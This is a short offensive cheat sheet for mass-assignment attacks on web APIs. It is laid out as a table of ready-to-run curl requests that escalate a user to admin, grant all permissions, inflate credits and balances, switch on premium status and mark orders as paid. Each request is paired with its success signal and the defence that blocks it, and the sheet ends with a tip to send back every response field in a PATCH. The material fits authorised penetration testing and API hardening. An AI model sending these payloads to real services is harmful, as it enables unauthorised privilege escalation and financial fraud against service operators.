# MASS ASSIGNMENT — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Role** | role/is_admin in response | `curl -X PATCH /api/user -d '{"role":"admin","is_admin":true}'` | role changed | ignored/whitelist |
| **Balance** | balance/credits field | `curl -X PATCH /api/profile -d '{"credits":9999,"balance":500}'` | balance updated | read-only field |
| **Premium** | premium/trial fields | `curl -X POST /api/signup -d '{"email":"x@x.com","is_premium":true}'` | premium active | server-side check |
| **Status** | status field | `curl -X PUT /api/order -d '{"status":"verified","paid":true}'` | order marked paid | status machine |
| **Permissions** | permissions array | `curl -X PUT /api/role -d '{"permissions":["*"]}'` | user has all perms | whitelist |

**Universal probe:** Send ALL fields you see in response back in PATCH
